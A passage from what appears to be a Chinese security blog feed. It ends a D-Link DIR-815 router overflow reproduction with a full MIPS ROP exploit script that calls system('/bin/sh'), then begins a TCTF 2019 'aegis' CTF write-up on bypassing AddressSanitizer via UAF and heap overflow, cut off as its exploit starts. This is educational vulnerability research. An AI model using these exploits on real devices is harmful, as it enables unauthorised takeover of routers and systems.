class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是由于一些原因在qemu用户模式不能成功getshell：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/15.png"></div><p>我们在后面也会尝试解决这个问题</p><h2 id="exp2-system-“-bin-sh”"><a href="#exp2-system-“-bin-sh”" class="headerlink" title="exp2 system(“/bin/sh”)"></a>exp2 system(“/bin/sh”)</h2><p>system函数的真实地址0x76738000+0x53200=0x7678b200</p><p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。</p><p>找用得上的gadgets<br>mipsrop.find(“addiu .*,1”)</p><p>完整exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"little"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>sleep_addr <span class="token operator">=</span> <span class="token number">0x56bd0</span>system_addr <span class="token operator">=</span> <span class="token number">0x53200</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x5a448</span>rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> <span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span><span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span><span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span><span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span><span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span><span class="token comment" spellcheck="true">#.text:0003E538 jr    </span>rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span><span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span><span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span><span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>rop3 <span class="token operator">=</span> <span class="token number">0xb814</span><span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span><span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span><span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span><span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span><span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span><span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>rop5 <span class="token operator">=</span> <span class="token number">0x4c138</span><span class="token comment" spellcheck="true"># .text:0004C138 move    $a0, $s2</span><span class="token comment" spellcheck="true"># .text:0004C13C move    $t9, $s0</span><span class="token comment" spellcheck="true"># .text:0004C140 jalr    $t9 ; s</span>rop6 <span class="token operator">=</span> <span class="token number">0x45988</span><span class="token comment" spellcheck="true"># .text:00045988                 addiu   $s0, 1</span><span class="token comment" spellcheck="true"># .text:0004598C                 move    $a0, $s0</span><span class="token comment" spellcheck="true"># .text:00045990                 move    $t9, $s1</span><span class="token comment" spellcheck="true"># .text:00045994                 jalr    $t9</span>rop7 <span class="token operator">=</span> <span class="token number">0x00159D8</span><span class="token comment" spellcheck="true"># text:000159CC                 addiu   $s5, $sp, 0x170+var_160</span><span class="token comment" spellcheck="true"># .text:000159D0                 move    $a1, $s3</span><span class="token comment" spellcheck="true"># .text:000159D4                 move    $a2, $s1</span><span class="token comment" spellcheck="true"># .text:000159D8                 move    $t9, $s0</span><span class="token comment" spellcheck="true"># .text:000159DC                 jalr    $t9 ; mempcpy</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x3cb</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">0xc</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token operator">+</span>base_addr<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>rop5<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>binsh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop6<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload1"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/16.png"></div>但是仍然无法getshell，需要起qemu-system-mipsel来复现完整的getshell的过程<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 TCTF aegis</title>
      <link href="/2020/10/29/tctf-2019-aegis/"/>
      <url>/2020/10/29/tctf-2019-aegis/</url>
      
        <content type="html"><![CDATA[<p>这道题是学习学弟的博客看到的感觉很有趣拿来学习学习</p><h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/0.png"></div>我们看到除了常见的五个保护还有ASAN和UBSAN两个保护。<h1 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h1><p>在这里我们需要进行知识点补充：asan(AddressSanitizer)是google开源的一个用于进行内存检测的工具，可以<strong>检测常见的heap and stack BufferOverflow，global buffer overflow, UAF</strong>等。</p><p>AddressSanitizer主要包括两部分：<strong>插桩</strong>(Instrumentation)和<strong>动态运行库</strong>(Run-time library)。<strong>插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)</strong> ，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。</p><p><strong>举例：防止overflow</strong>，该算法的思路是：如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。具体的示意图如下图所示。</p><p><strong>内存映射：</strong><br>AddressSanitizer保护的主要原理是<strong>对程序中的虚拟内存提供粗粒度的影子内存(每8个字节的内存对应一个字节的影子内存)</strong> ，为了减少overhead，采用了直接内存映射策略，</p><p>所采用的具体策略如下：Shadow=(Mem &gt;&gt; 3) + offset。<br>对于32位offset=0x20000000，64位是0x7fff8000</p><p><strong>每8个字节的内存对应一个字节的影子内存，影子内存中每个字节存取一个数字k,如果k=0，则表示该影子内存对应的8个字节的内存都能访问，如果0&lt;k&lt;7,表示前k个字节可以访问，如果k为负数，不同的数字表示不同的错误（e.g. Stack buffer overflow, Heap buffer overflow)。</strong><br>即：</p><ol><li>8字节的内容可写，则影子内存对应的1字节数据为0</li><li>8字节的内容不可写，则影子内存中对应的1字节数据为负数</li><li>8字节中前n字节可写，剩余地址不可写，则影子内存中对应的1字节数据为k</li></ol><p><strong>ASan 的检查很大一部分是基于影子内存中，此时影子内存的flag值。假设如果全段影子内存的 flag 全为0，我们就可以完全无视掉ASan，而0ctf 的 babyaegis，正是给了一个写0的机会，给了我们一次对一个指针再次读写的机会。</strong></p><p><strong>插桩</strong>:  为了防止buffer overflow，需要将原来分配的内存两边分配额外的内存Redzone，并将这两边的内存加锁，设为不能访问状态，这样可以有效的防止buffer overflow(但不能杜绝buffer overflow)</p><p>Heap Variable保存在堆区，其分配的函数是malloc函数，该部分的主要代码在runtime-library中，该库中主要是先将malloc的库函数hook住，然后自己定义malloc函数，定义分配策略。</p><p>对于栈上的变量，会在编译时插桩，在每个栈变量前后都加上Redzone，Redzone是不能读写的，同样还会进行Shadow Memory的映射</p><p>对于动态分配的内存，会hook掉对应的函数，如malloc, free，然后使用自己的分配策略，同样会用Shadow Memory进行映射：对于会有内存操作的库函数，如strlen等，都会进行hook掉，动态的检测内存hook掉的malloc分配的策略大概可以描述如下，不同size分配的内存区域不同，但是地址会固定，如0x10字节大小的，一开始都会分配到0x602000000010这个地址分配的每块内存的前面0x10个字节都会带有一些描述这块内存的信息，如size，使用状态free掉之后的内存正常情况是不会再次被分配的。</p><p>详细请看：<a href="https://blog.csdn.net/pang241/article/details/76137969" target="_blank" rel="noopener">AddressSanitizer算法及源码解析</a></p><p>创建0x100size的chunk：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/1.png"></div>第一块是manage部分，可以看到chunkaddr+0x18处是content的size，这时我们看到第二部分也就是其对应的content部分，我们分配的是0x100大小，部分内容已经被我们赋值。第三部分是影子内存：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/2.png"></div>我们看到对应的影子内存有0x20个字节数据为0，根据前面的内容也就知道了对应0x20*8的数据可写。<p>删除后：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/3.png"></div>即不可写了。<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>create：<br>大概是先进行创建content的chunk，最多读取size-8到chunk中，在chunk后面读入index的值。<br>然后malloc（0x10）的管理结构体，写入content chunk地址和函数指针</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> __int64 v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rcx</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  __int64 <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> __int64 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  <span class="token keyword">unsigned</span> __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>  __int64 chunkAddr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  v15 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token function">_asan_report_load8</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v0 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v15 <span class="token operator">=</span> i<span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size <span class="token operator">=</span> <span class="token function">read_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;</span> <span class="token number">0x10</span> <span class="token operator">||</span> size <span class="token operator">></span> <span class="token number">0x400</span> <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  chunkAddr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__asan <span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>chunkAddr <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token function">read_until_nl_or_max</span><span class="token punctuation">(</span>chunkAddr<span class="token punctuation">,</span> size <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token string">"ID: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">read_ul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> v13 <span class="token operator">+</span> chunkAddr<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    v1 <span class="token operator">=</span> <span class="token function">_asan_report_store8</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> v1<span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__asan <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>word_10<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    v3 <span class="token operator">=</span> <span class="token function">_asan_report_store8</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">_asan_report_load8</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token punctuation">)</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> chunkAddr<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">_asan_report_load8</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v7<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v7 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    v8 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">_asan_report_store8</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>v8 <span class="token operator">=</span> v6<span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> v15<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v9 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">_asan_report_load8</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  v10 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v9 <span class="token operator">+</span> <span class="token number">8LL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v10 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x7FFF8000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">_asan_report_store8</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v10 <span class="token operator">=</span> cfi_check<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Add success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>show</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/4.png"></div><p>delete没有清空指针</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/5.png"></div><p>update函数</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/6.png"></div>每update一次就会导致多写一位，最后会和ID连在一起，导致溢出<p>后门函数，可以写影子内存</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/7.png"></div><p>三个漏洞：第一个是delete函数没有清空内存指针，造成可以UAF，第二个则是在update函数的时候strlen就会超出预期的长度，造成堆溢出。（只需要输入ID的时候不要有\x00）</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>思路很简单了，通过后门函数改影子内存，将溢出后面设置可写，这样就可以利用update进行堆溢出修改下个堆块的size位了。将chunk的user_requested_size改为大于256M的数值，之后malloc的将还是这块chunk。（应该是其特殊的回收策略，具体可能得去看源码才能知道原因了）</p><p>改掉影子内存值，赋予0x602000000020可写：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/8.png"></div><p>off by one改掉size：ChunkHeader的2-nd 8 Bytes的低29字节表示的是user_requested_size位置，也就是size从0x10大小被改为了0x10000000大小。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/9.png"></div><p>这个时候释放这个chunk后，再分配将得到一个overlapping的chunk，也就是说我们下个分配的buf位置将会是第一个的note manage的地址。也就是说我们可以改掉在note中heap_addr的值，通过show进行一系列的leak操作</p><p>第一步先leak 程序加载地址，第二步通过函数得到libc，第三步改bss上函数指针为one_gadget，最后再检测cfi函数和cfi_check函数不一样的时候会进行的函数调用如下：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/10.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/11.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/29/tctf-2019-aegis/12.png"></div><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>exp是用lyyl师傅的exp调的，太懒了Orz..</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span 